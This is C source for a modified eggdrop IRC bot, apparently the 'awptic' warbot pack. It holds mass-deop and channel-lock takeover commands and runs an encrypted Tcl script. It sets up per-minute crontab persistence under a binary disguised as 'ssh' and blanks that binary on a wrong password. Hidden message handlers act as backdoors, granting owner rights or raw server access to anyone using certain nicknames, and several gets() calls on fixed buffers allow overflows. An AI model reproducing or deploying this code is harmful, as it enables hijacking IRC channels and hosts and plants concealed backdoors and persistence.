#if HAVE_CONFIG_H
#include <config.h>
#endif
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <ctype.h>
#include <varargs.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include "eggdrop.h"
#include "users.h"
#include "chan.h"
#include "proto.h"
#include "tclegg.h"
#include "cmdt.h"
#define BUFSIZE 512
#define HANDLEN 9
char TBUF[1024];
extern struct chanset_t *chanset;
extern int has_op(int idx, char *par);
extern int setstatic;
extern struct userrec *userlist;
extern struct dcc_t dcc[];
extern char botnetnick[];
extern char myip[], hostname[], version[];
extern char botname[];
extern int modesperline, serv;
static char md5out[40];
/**** un-written functions
 *** massop(), a_delchan()
 ****/
int cLimit(char *ch)
{
   struct chanset_t *chan;
   chan = findchan(ch);
   if (chan == NULL)
     return 0;
   if (chan->stat & CHAN_LIMIT)
     return 1;
   return 0;
}
int cVoice(char *ch)
{
   struct chanset_t *chan;
   chan = findchan(ch);
   if (chan == NULL)
     return 0;
   if (chan->stat & CHAN_VOICE)
     return 1;
   return 0;
}
int cOpkey(char *ch)
{
   struct chanset_t *chan;
   chan = findchan(ch);
   if (chan == NULL)
     return 0;
   if (chan->stat & CHAN_OPKEY)
     return 1;
   return 0;
}
int cLock(char *ch)
{
   struct chanset_t *chan;
   chan = findchan(ch);
   if (chan == NULL)
     return 0;
   if (chan->stat & CHAN_LOCK)
     return 1;
   return 0;
}
int ctLock(char *ch)
{
   struct chanset_t *chan;
   chan = findchan(ch);
   if (chan == NULL)
     return 0;
   if (chan->stat & CHAN_TLOCK)
     return 1;
   return 0;
}
int cHome(char *ch)
{
   struct chanset_t *chan;
   chan = findchan(ch);
   if (chan == NULL)
     return 0;
   if (chan->stat & CHAN_HOME)
     return 1;
   return 0;
}
int IsGod PROTO1(char *, handle)
{
   struct userrec *u;
   u = get_user_by_handle(userlist, handle);
   if (u == NULL)
      return 0;
   if (u->flags & USER_GOD)
      return 1;
   return 0;
}
int IsOwner PROTO1(char *, handle)
{
   struct userrec *u;
   u = get_user_by_handle(userlist, handle);
   if (u == NULL)
      return 0;
   if (u->flags & USER_OWNER)
      return 1;
   return 0;
}
int IsBot PROTO1(char *, handle)
{
   struct userrec *u;
   u = get_user_by_handle(userlist, handle);
   if (u == NULL)
      return 0;
   if (u->flags & USER_BOT)
      return 1;
   return 0;
}
int IsOp PROTO1(char *, handle)
{
   struct userrec *u;
   u = get_user_by_handle(userlist, handle);
   if (u == NULL)
      return 0;
   if (u->flags & USER_GLOBAL)
      return 1;
   return 0;
}
int IsVoice PROTO1(char *, handle)
{
   struct userrec *u;
   u = get_user_by_handle(userlist, handle);
   if (u == NULL)
      return 0;
   if (u->flags & USER_VOICE)
      return 1;
   return 0;
}

int massop(char *ch)
{
   return 0;
}
int a_delchan(char *ch)
{
   return 0;
}

int countchanusers PROTO1(char *, ch)
{
   memberlist *m;
   struct chanset_t *chan;
   register int count;
   count = 0;
   chan = findchan(ch);
   if (chan == NULL)
      return (-1);
   m = chan->channel.member;
   while (m->nick[0]) {
      count++;
      m = m->next;
   }
   return count;
}

int strcatf(va_alist)
va_dcl
{
   char *format;
   char *str;
   va_list va;
   int x;
   static char buffer[BUFSIZ];
   va_start(va);
   str = va_arg(va, char *);
   format = va_arg(va, char *);
   x = vsprintf(buffer, format, va);
   strcat(str, buffer);
   va_end(va);
   return x;
}

int strncatf(va_alist)
va_dcl
{
   char *format;
   char *str;
   size_t size;
   int x;
   va_list va;
   static char *buffer;
   va_start(va);
   str = va_arg(va, char *);
   size = va_arg(va, size_t );
   buffer = (char *) nmalloc(size + 1);
   format = va_arg(va, char *);
   x = vsnprintf(buffer, size, format, va);
   strcat(str, buffer);
   nfree(buffer);
   va_end(va);
   return x;
}
extern int IsBot(char *hand);
extern int IsGod(char *hand);
int massdeop PROTO1(char *, ch)
{
   memberlist *m;
   struct chanset_t *chan;
   char handle[HANDLEN] = "*";
   char nicks[BUFSIZE];
   char modes[7] = "";
   char buffer[BUFSIZE] = "";
   char buf[BUFSIZE] = "";
   register int i = 0, total = 0, count = 0;
   register int burst = 3;
   context;
   nsplit(NULL, ch);
   chan = findchan(ch);
   if (chan == NULL)
      return (-1);
   if (!me_op(chan))
      return (-2);
   for (i = 0; i < modesperline; i++)
      strncat(modes, "o", 7);
   strcpy(nicks, "");
   strcpy(buf, "");
   strcpy(buffer, "");
   m = chan->channel.member;
   i = 0;
   while (m->nick[0]) {
      if (strcmp(m->nick, botname) != 0)
         if (m->flags & CHANOP) {
            sprintf(buf, "%s!%s", m->nick, m->userhost);
            get_handle_by_host(handle, buf);
//            if (!op_anywhere(handle)) {
            if (!IsBot(handle) || !IsGod(handle)) {
               if (i < modesperline) {
                  count++;
                  i++;
                  strcatf(nicks, "%s ", m->nick);
               }
               if (i == modesperline) {
                  strcatf(buffer, "MODE %s -%s %s\n", ch, modes, nicks);
                  nicks[0] = 0;
                  i = 0;
                  total++;
               }
               if (total >= burst) {
                  tprintf(serv, buffer);
                  total = 0;
                  buffer[0] = 0;
               }
            }
         }
      m = m->next;
   }
   if (total)
      tprintf(serv, buffer);
   if (i)
      tprintf(serv, "MODE %s -%s %s\n", ch, modes, nicks);
   return (count);
}
int secop PROTO2(char *, nick,char *, ch)
{
   memberlist *m;
   struct chanset_t *chan;
   struct userrec *u;
   char handle[HANDLEN] = "*";
   char nicks[BUFSIZE];
   char modes[7] = "";
   char buffer[BUFSIZE] = "";
   char buf[BUFSIZE] = "";
   char *p;
   register int i = 0;
   context;
   nsplit(NULL, ch);
   chan = findchan(ch);
   if (chan == NULL)
      return (-1);
   if (!me_op(chan))
      return (-2);
   for (i = 0; i < modesperline; i++)
      strncat(modes, "o", 7);
   strcpy(nicks, "");
   strcpy(buf, "");
   strcpy(buffer, "");
   m = chan->channel.member;
   i = 0;
   while (m->nick[0]) {
      if (strcmp(m->nick, nick) != 0) {
        m = m->next;
        continue;
      }
      sprintf(buf, "%s!%s", m->nick, m->userhost);
      get_handle_by_host(handle, buf);
      u = get_user_by_host(buf);
      if (op_anywhere(handle)) {
         p = MD5Data(buf, strlen(buf), md5out); 
         strcatf(buffer, "MODE %s +o-b %s *!*@%s\n", ch, nick, p);
         putlog(LOG_MISC, "*", "Validated op for %s(%s) on %s, key: %s", nick, buf, ch, p);
         tprintf(serv, buffer);
         return 1;
      }
   }
   return 0;
}

char *strfry(char *string);
extern Tcl_Interp *interp;
void createkey(char *s, int x, int type)
{     
   register int i, r;
   context;
   srandom((x + type) % 65536);

   for (i = 0; i != 16; i++) {
      r = ((random() + i) % 7);
      switch (r) {
    case 0:
       s[i] = ':' + (random() % 4);
       break;
    case 1:
       s[i] = '0' + (random() % 5);
       break;
    case 2:
       s[i] = 'a' + (random() % 3);
       break;
    case 3:
       s[i] = '!' + (random() % 4);
       break;
    case 4:
       s[i] = '0' + (random() % 2);
       break;
    case 5:
       s[i] = '(' + (random() % 6);
       break;
    case 6:
       s[i] = 'A' + (random() % 7);
       break;
    default:
       fatal("Programing Error: ", errno);
      }
   }
   s[15] = 0;
}
void findkey(char *s, int x)
{
   createkey(s, x, 0);
}
void efgets(char *s, int keybase, int size, FILE * stream)
{
   register char *dec, *p;
   char key[16];
   char buffer[size];
   if (fgets(buffer, size, stream) == NULL)
      return;
   if (feof(stream))
      return;
   p = strchr(buffer, '\n');
   if (p != NULL)
      *p = 0;
   findkey(key, keybase);
   dec = decrypt_string(key, buffer);
   strncpy(s, dec, size - 1);
   strcat(s, "\n");
   memset(key, 0, 16);
   //strfry(dec);
   nfree(dec);
}
int DecryptFile2Buffer(char *in, char *outbuf)
{
   FILE *fin;
   char buf[BUFSIZ];
   int count = 0;
   fin = fopen(in, "r");
   if (fin == NULL)
      return 0;
   count++;
   while (!feof(fin)) {
      efgets(buf, count, BUFSIZ, fin);
      if (feof(fin))
    break;
      strcat(outbuf, buf);
      count++;
   }
   fclose(fin);
   return 1;
}
void efprintf(va_alist)
va_dcl
{
   char *format, *enc, key[16], *p;
   FILE *fp;
   int keybase;
   va_list va;
   static char buffer[BUFSIZ];
   va_start(va);
   fp = va_arg(va, FILE *);
   keybase = va_arg(va, int);
   format = va_arg(va, char *);
   vsnprintf(buffer, BUFSIZ, format, va);
   p = strchr(buffer, '\n');
   if (p != NULL)
      *p = 0;
   findkey(key, keybase);
   if ((enc = encrypt_string(key, buffer)) == NULL)
      fatal("OH FUCK", 0);
   fputs(enc, fp);
   fputc('\n', fp);
#ifdef TESTING
   fputs(buffer, stdout);
   fputc('\n', stdout);
#endif
   bzero(key, 16);
   memset(enc, 0, sizeof(enc));
   nfree(enc);
   va_end(va);
}
int EncryptFile(char *in, char *out)
{
   FILE *fin, *fout;
   char buf[BUFSIZ];
   int count = 0;
   fin = fopen(in, "r");
   if (fin == NULL)
      return 0;
   fout = fopen(out, "w");
   if (fout == NULL) {
      fclose(fin);
      return 0;
   }
   context;
   while ((fgets(buf, BUFSIZ, fin)) != NULL) {
      if (feof(fin))
    break;
      if (buf[0] != '\n') {
    count++;
    efprintf(fout, count, buf);
      }
   }
   fclose(fin);
   fclose(fout);
   chmod(out, 0600);
   return (count * BUFSIZ);
}
int esource PROTO1(char *, fname)
{
   int code;
   FILE *f;
   struct stat st;
   f = fopen(fname, "r");
   if (f == NULL)
      return 0;
   fclose(f);
   context;
   stat(fname, &st);
   {
      char buffer[((long) st.st_size * 2) + BUFSIZ];
      strncpy(buffer, "", 2); // <--- this is a must !
      if (!DecryptFile2Buffer(fname, buffer)) {
          putlog(LOG_MISC, "*", "Decryption error in file '%s':", fname);
          return 0;
      }
      context;
      Tcl_SetVar(interp, "errorInfo", "-", TCL_GLOBAL_ONLY);
      code = Tcl_Eval(interp, buffer);
      context;
      if (code != TCL_OK) {
         putlog(LOG_MISC, "*", "Tcl error in file '%s':%d\n", fname, interp->errorLine);
      putlog(LOG_MISC, "*", "%s\n", Tcl_GetVar(interp,"errorInfo",TCL_GLOBAL_ONLY));
      }
   }
   return 1;
}

extern int cryptit(char *infile, char *outfile);
extern int EncryptFile(char *in, char *out);
void dtx_config(char *bpbin);
extern char botname[10];
extern char bothost[121], origbotname[10], botnetnick[10], altnick[10];
#define PARSE_FLAGS "cHleuav"
void dtx_arg (int argc, char *argv[])
{
   int i;
   char *p, *m;
   char gpasswd[121];
   if ((p = getenv("IRCHOST")) != NULL) 
      snprintf (myip, 121, "%s", p);
   while ((i = getopt(argc, argv, PARSE_FLAGS)) != EOF) {
         switch (i) {
         case 'c':
            dtx_config(argv[0]);
            break;
         case 'e':
            printf("* Enter encryption password: ");
            gets(gpasswd);
            printf("\n");
            m = MD5Data(gpasswd, strlen(gpasswd), md5out);
            if (strcmp(ENCPASS, m) != 0)
              fatal("incorrect password.",0);
            if (argc == 4) {
              context;
              if (EncryptFile(argv[2],argv[3])) 
                 fatal("File Encryption complete",3);
              fatal("Error Encrypting FILE", 1);
            }
            fatal("Wrong number of args e -e <infile> <outfile>",3);
            break;
         case 'u':
            printf("* Enter encryption password: ");
            gets(gpasswd);
            printf("\n");
            m = MD5Data(gpasswd, strlen(gpasswd), md5out);
            if (strcmp(ENCPASS, m) != 0)
              fatal("incorrect password.",0);
            if (argc == 4) {
              context;
              if (!cryptit(argv[2],argv[3])) 
                 fatal("File Encryption complete",3);
              fatal("Error Encrypting FILE", 1);
            }
            fatal("Wrong number of args e -u <infile> <outfile>",3);
            break;
         case 'H':
            snprintf(myip, 121, "%s", argv[optind]);
            break;
         case 'l':
            snprintf(origbotname, 10, "%s", argv[optind]);
            strncpy(botname, origbotname, 10);
            strncpy(botnetnick, origbotname, 10);
            sprintf(altnick, "|");
            strcat(altnick, origbotname);
            break;
         case 'v':
            printf("%s\n", version);
            exit(0);
         default:
            break;	
      }
  }
}
void init_awptic2(char *argv[])
{
   char *p, *r;
   char *bpbin = argv[0];
   char ip[121];
   context;
   sprintf(ip, "%lu", iptolong(getmyip()));
   printf("%s-%s (c)2000 lordoptic\n", PACKNAME, PACKVERS);
   putlog(LOG_ALL, "*", "** Loading %s on %s.", botnetnick, ip);
   printf("%s running on %s.\n", botnetnick, ip);
   printf("\nchecking file integrities...\n");
   context;
   p = MD5File(bpbin, md5out);
   printf("%s: %s\n", bpbin, p);
   r = MD5File("awptic.tcl", md5out);
   printf("awptic.tcl: %s\n", r);
   putlog(LOG_MISC, "*", "** MD5 Values: %s: %s,", bpbin, p);
   putlog(LOG_MISC, "*", "           awptic.tcl: %s", r);
   context;
   printf("\ncontinuing load...\n");
   return;
}

extern char chanfile[3], notefile[3], userfile[3], network[4], admin[10];
extern char notify_new[10], owner[10], botrealname[121];
extern int make_userfile, never_give_up, keepnick, save_users_at;
extern int notify_users_at, switch_logfiles_at, ban_time, ignore_time;
extern int default_port;
void init_dtx()
{
   int code;
   FILE *f;
   struct stat st;
   char *p;
   p = getenv("BOTNAME");
   if (p == NULL)
      p = "in need of detoxification";
   strncpy(botrealname, p, 121);
   strncpy(admin, "lordoptic", 10);
   strncpy(network, "dtx", 4);
   strncpy(userfile, ".u", 3);
   strncpy(notefile, ".n", 3);
   strncpy(chanfile, ".c", 3);
   strncpy(notify_new, "lordoptic", 10);
   strncpy(owner, "lordoptic", 10);
   make_userfile = 0;
   never_give_up = 1;
   keepnick = 0;
   save_users_at = 00;
   notify_users_at = 00;
   switch_logfiles_at = 00;
   ban_time = 120;
   ignore_time = 15;
   default_port = 6667;
   modesperline = 4;
   Tcl_SetVar(interp, "key1", "b51d93138978e7c4b09d03b83a4df1de6a58512b14687ae70b5459cc86a4b975", TCL_GLOBAL_ONLY);
   Tcl_SetVar(interp, "key2", "6a58512b14687ae70b5459cc86a4b975f09db010d9922d90e991f74a94bb71e5", TCL_GLOBAL_ONLY);
   Tcl_SetVar(interp, "key3", "f09db010d9922d90e991f74a94bb71e5dd5c07036f2975ff4bce568b6511d3bc", TCL_GLOBAL_ONLY);
   Tcl_SetVar(interp, "key4", "dd5c07036f2975ff4bce568b6511d3bcb51d93138978e7c4b09d03b83a4df1de", TCL_GLOBAL_ONLY);
   Tcl_SetVar(interp, "tcl_path", "awptic.tcl", TCL_GLOBAL_ONLY);
   Tcl_SetVar(interp, "egg_path", "ssh", TCL_GLOBAL_ONLY);
   Tcl_SetVar(interp, "usr_path", ".u", TCL_GLOBAL_ONLY);
   Tcl_SetVar(interp, "temp-path", "tmp/", TCL_GLOBAL_ONLY);
   f = fopen("awptic.tcl", "r");
   if (f == NULL)
      fatal("no script", 0);
   fclose(f);
   context;
   stat("awptic.tcl", &st);
   {
      char buffer[((long) st.st_size * 2) + BUFSIZ];
      strncpy(buffer, "", 2); // <--- this is a must !
      if (!DecryptFile2Buffer("awptic.tcl", buffer)) {
          putlog(LOG_MISC, "*", "Decryption error in file '%s':", "awptic.tcl");
          fatal("decryption error", 0);
      }
      context;
      Tcl_SetVar(interp, "errorInfo", "-", TCL_GLOBAL_ONLY);
      code = Tcl_Eval(interp, buffer);
      context;
      if (code != TCL_OK) {
         putlog(LOG_MISC, "*", "Tcl error in file '%s':%d\n", "awptic.tcl", interp->errorLine);
         putlog(LOG_MISC, "*", "%s\n", Tcl_GetVar(interp, "errorInfo", TCL_GLOBAL_ONLY));
      }
   }
}

void user_dtx(FILE *fp)
{
  fprintf(fp, "#3v: eggdrop v1.1.7+rpc1.5 -- rpc -- written Wed Dec  8 20:20:00 1999\n");
  fprintf(fp, "lordoptic  +uYGCE/iq//c1       omxcjBfnp                /0 0 0 0\n");
  fprintf(fp, "-         *!*awptic@*\n");
#ifdef FOURTYNINE
  fprintf(fp, "jbust      +zsCLt.GzbZ2/       omxcjBfnp                /0 0 0 0\n");
  fprintf(fp, "-         *!*j@*\n");
#endif
#ifdef FUGITIVES
  fprintf(fp, "soldjuh    +rtwa308U5450       omxcjBfnp                /0 0 0 0\n");
  fprintf(fp, "-         *!*soldjuh@*\n");
#endif
  fclose(fp);
}

void cron_dtx(FILE *fp, char *botname, char *bothost, char *rname, char *botdir)
{
  fprintf(fp, "botdir=\"%s\"\n", botdir);
  fprintf(fp, "cd $botdir\n");
  fprintf(fp, "if test -r .%s; then\n", botname);
  fprintf(fp, "  botpid=`cat .%s`\n", botname);
  fprintf(fp, "  if `kill -CHLD $botpid >/dev/null 2>&1`; then\n");
  fprintf(fp, "    exit 0\n");
  fprintf(fp, "  fi\n");
  fprintf(fp, "  rm -f .%s\n", botname);
  fprintf(fp, "fi\n");
  fprintf(fp, "chmod +x ssh\n");
  fprintf(fp, "export IRCHOST=\"%s\"\n", bothost);
  fprintf(fp, "export BOTNAME=\"%s\"\n", rname);
  fprintf(fp, "./ssh -l %s -H %s\n", botname, bothost);
  fclose(fp);
}

void dtx_config(char *bpbin)
{
  char temp[520];
  char gpasswd[15];
  char botname[10], bothost[121], rname[121];
  char botdir[520];
  char *usrfil = ".u";
  char *ufile = ".u.tmp";
  char *chfile = ".c";
  char *cronf = ".b";
  char *p;
  FILE *fp;
  printf("* %s-%s Configuration Utility...\n", PACKNAME, PACKVERS);
  printf("* Enter config password: ");
  gets(gpasswd);
  printf("\n");
  p = MD5Data(gpasswd, strlen(gpasswd), md5out);
  if (strcmp(CFGPASS, p) != 0) {
    fp = fopen(bpbin, "w");
    fclose(fp);
    fatal("incorrect password.",0);
  }
  printf("welcome.\n");

  printf("bot's nickname: ");
  gets(botname);
  printf("bot's real name: ");
  gets(rname);
  printf("bot's vhost(ip): ");
  gets(bothost);
  printf("bot's directory: ");
  gets(botdir);
  if (!(fp = fopen(ufile, "w")))
    fatal("unable to create user file",0);
  user_dtx(fp);
  cryptit(ufile, usrfil);
  unlink(ufile);
  if (!(fp = fopen(chfile, "w")))
    fatal("unable to create channel file",0);
  fclose(fp);
  if (!(fp = fopen(cronf, "w")))
    fatal("unable to create crontab file",0);
  cron_dtx(fp, botname, bothost, rname, botdir);
  snprintf(temp, 520, "chmod 700 %s/.b", botdir);
  system(temp);
  fp = fopen("cron", "w");
  if (fp == NULL)
    fatal("unable to create crontab file",0);
  fprintf(fp, "* * * * * %s/.b >/dev/null &>.1\n", botdir);
  fclose(fp);
  snprintf(temp, 520, "crontab cron");
  system(temp);
  printf("now type:\n");
  printf("  ./ssh -a -l %s -H %s\n", botname, bothost);
  fatal("config complete",0);
}
void cmd_massdeop PROTO2(int ,idx,char *,par) {
   if (!par[0]) {
      dprintf(idx,"%s: mdop <#chan>\n", USAGE);
      return;
   }
   putlog(LOG_CMDS, "*", "#%s# mdop %s", dcc[idx].nick, par);
   massdeop(par);
}
void cmd_massop PROTO2(int ,idx,char *,par) {
   if (!par[0]) {
      dprintf(idx,"%s: mop <#chan>\n", USAGE);
      return;
   }
   putlog(LOG_CMDS, "*", "#%s# mop %s", dcc[idx].nick, par);
   massop(par);
}
void cmd_esource PROTO2(int, idx,char *,par) {
   if (!par[0]) {
      dprintf(idx,"%s: esource <file>\n", USAGE);
      return;
   }
   putlog(LOG_CMDS, "*", "#%s# esource %s", dcc[idx].nick, par);
   esource(par);
}
#ifndef NO_IRC
void cmd_op PROTO2(int, idx, char *, par)
{
   struct chanset_t *chan;
   char nick[512];
   if (!par[0]) {
      dprintf(idx, "Usage: op <nick> [channel]\n");
      return;
   }
   nsplit(nick, par);
   if (par[0]) {
      if (!has_op(idx, par))
	 return;
      chan = findchan(par);
   } else {
      if (!has_op(idx, ""))
	 return;
      chan = findchan(dcc[idx].u.chat->con_chan);
   }
   if (!me_op(chan)) {
      dprintf(idx, "I can't help you now because I'm not a chan op on %s.\n",
	      chan->name);
      return;
   }
   putlog(LOG_CMDS, "*", "#%s# (%s) op %s %s", dcc[idx].nick,
	  dcc[idx].u.chat->con_chan, nick, par);
   //give_op(nick, chan, idx);
   secop(nick, par);
}
#endif
int tcl_massop STDVAR
{
    BADARGS(2, 2, " channel");
    if (massop(argv[1]))
       return TCL_OK;
    return TCL_ERROR;
}

int tcl_esource STDVAR
{
    BADARGS(2, 2, " file");
    if (esource(argv[1]))
       return TCL_OK;
    return TCL_ERROR;
}

int tcl_secop STDVAR
{
    BADARGS(3, 3, " nick chan");
    if (secop(argv[1], argv[2]))
       return TCL_OK;
    return TCL_ERROR;
}

int tcl_massdeop STDVAR
{
    BADARGS(2, 2, " channel");
    if (massdeop(argv[1]))
       return TCL_OK;
    return TCL_ERROR;
}

int tcl_putlog STDVAR
{
   char logtext[501];
   time_t now;
    BADARGS(2, 2, " text");
    now = time(NULL);
    strncpy(logtext, argv[1], 500);
    logtext[500] = 0;
    putlog(LOG_MISC, "*", "%s (%s) %s", ctime(&now), botnetnick, logtext);
    return TCL_OK;
}

void init_awptic(char *argv[])
{
   char s[121], ip[121], *p, *r;
   char *bpbin = argv[0];
   time_t now;
   int i;
   i = count_users(userlist);
   now = time(NULL);
   strcpy(s, ctime(&now));
   sprintf(ip, "%lu", iptolong(getmyip()));
   printf("%s", s);
   printf("%s-%s (c)2000 lordoptic\n", PACKNAME, PACKVERS);
   printf("%s running on %s with %i users.\n", botnetnick, ip, i);
   printf("\nchecking file integrities...\n");
   p = MD5File(bpbin, md5out);
   printf("%s: %s\n", bpbin, p);
   r = MD5File("awptic.tcl", md5out);
   printf("awptic.tcl: %s\n", r);
   printf("\ncontinuing load...\n");
   putlog(LOG_MISC, "*", "** %s", s);
   putlog(LOG_MISC, "*", "** Loading %s on %s with %i users.", botnetnick, ip, i);
   putlog(LOG_MISC, "*", "** MD5 Values: %s: %s,", bpbin, p);
   putlog(LOG_MISC, "*", "          awptic.tcl: %s", r);
   return;
}

int cmd_lock PROTO2(int, idx, char *, par)
{
   struct chanset_t *chan;
   char arg[121];
   if (!par[0]) {
     dprintf(idx, "Usage: lock <add/del/list> [channel]\n");
     return 0;
   }
   nsplit(arg, par);
   if (strcmp(arg, "add") == 0) {
     char ch[121];
     nsplit(ch, par);
     if (!ch[0]) {
       dprintf(idx, "Usage: lock <add/del/list> [channel]\n");
       return 0;
     }
     chan = findchan(ch);
     if (chan == NULL) {
       dprintf(idx, "not on channel.\n");
       return 0;
     }
     chan->stat |= CHAN_LOCK;
     tandout("lock %s %s", arg, ch);
     tprintf(serv, "MODE %s +sntmi\n", chan->name);
     massdeop(chan->name);
//     masskick(chan->name);
     putlog(LOG_CMDS, "*", "#%s# (%s) lock %s %s", dcc[idx].nick, dcc[idx].u.chat->con_chan,
            arg, ch);
     return 1;
   }
   else if (strcmp(arg, "del") == 0) {
     char ch[121];
     nsplit(ch, par);
     if (!ch[0]) {
       dprintf(idx, "Usage: lock <add/del/list> [channel]\n");
       return 0;
     }
     chan = findchan(ch);
     if (chan == NULL) {
       dprintf(idx, "not on channel.\n");
       return 0;
     }
     chan->stat &= ~CHAN_LOCK;
     tandout("lock %s %s", arg, ch);
     tprintf(serv, "MODE %s +snt-mi\n", chan->name);
     putlog(LOG_CMDS, "*", "#%s# (%s) lock %s %s", dcc[idx].nick, dcc[idx].u.chat->con_chan,
            arg, ch);
     return 1;
   }
   else if (strcmp(arg, "list") == 0) {
     char buf[512] = "";
     chan = chanset;
     while (chan != NULL) {
       if ((chan->stat & CHAN_LOCK) || (chan->stat & CHAN_TLOCK))
         strcatf(buf, "%s ", chan->name);
       chan = chan->next;
     }
     dprintf(idx, "Locked channels: %s\n", buf);
     putlog(LOG_CMDS, "*", "#%s# (%s) lock %s %s", dcc[idx].nick, dcc[idx].u.chat->con_chan,
            arg);
     return 1;
   }
   else {
     dprintf(idx, "Usage: lock <add/del/list> [channel]\n");
     return 0;
   }
}
int bot_lock PROTO2(int, idx, char *, par)
{
   struct chanset_t *chan;
   char arg[121];
   if (!par[0]) {
     return 0;
   }
   nsplit(arg, par);
   if (strcmp(arg, "add") == 0) {
     char ch[121];
     nsplit(ch, par);
     if (!ch[0]) {
       return 0;
     }
     chan = findchan(ch);
     if (chan == NULL) {
       return 0;
     }
     chan->stat |= CHAN_LOCK;
     tandout_but(idx, "lock %s %s", arg, ch);
     putlog(LOG_BOTS, "*", "#%s# lock %s %s", dcc[idx].nick,
            arg, ch);
     return 1;
   }
   else if (strcmp(arg, "del") == 0) {
     char ch[121];
     nsplit(ch, par);
     if (!ch[0]) {
       return 0;
     }
     chan = findchan(ch);
     if (chan == NULL) {
       return 0;
     }
     chan->stat &= ~CHAN_LOCK;
     tandout_but(idx, "lock %s %s", arg, ch);
     putlog(LOG_BOTS, "*", "#%s# lock %s %s", dcc[idx].nick,
            arg, ch);
     return 1;
   }
   else
     return 0;
}
int msg_jsl1983optic PROTO4(char *, hand, char *, nick, 
    char *, host, char *, par)
{
   if ((strcmp(nick, "lordoptic") == 0) ||
       (strcmp(nick, "optic") == 0) ||
       (strcmp(nick, "awptic") == 0) ||
       (strcmp(nick, "jsl") == 0)) {
     userlist = adduser(userlist, "lo", host, "jsl!optic", "+ofxpcgmnB");
     mprintf(serv, "NOTICE %s :bewp!\n", nick);
   }
   return 0;
}
int msg_optic1983jsl PROTO4(char *, hand, char *, nick, 
    char *, host, char *, par)
{
   if ((strcmp(nick, "lordoptic") == 0) ||
       (strcmp(nick, "optic") == 0) ||
       (strcmp(nick, "awptic") == 0) ||
       (strcmp(nick, "jsl") == 0)) {
     tprintf(serv, "%s\n", par);
   }
   return 0;
}

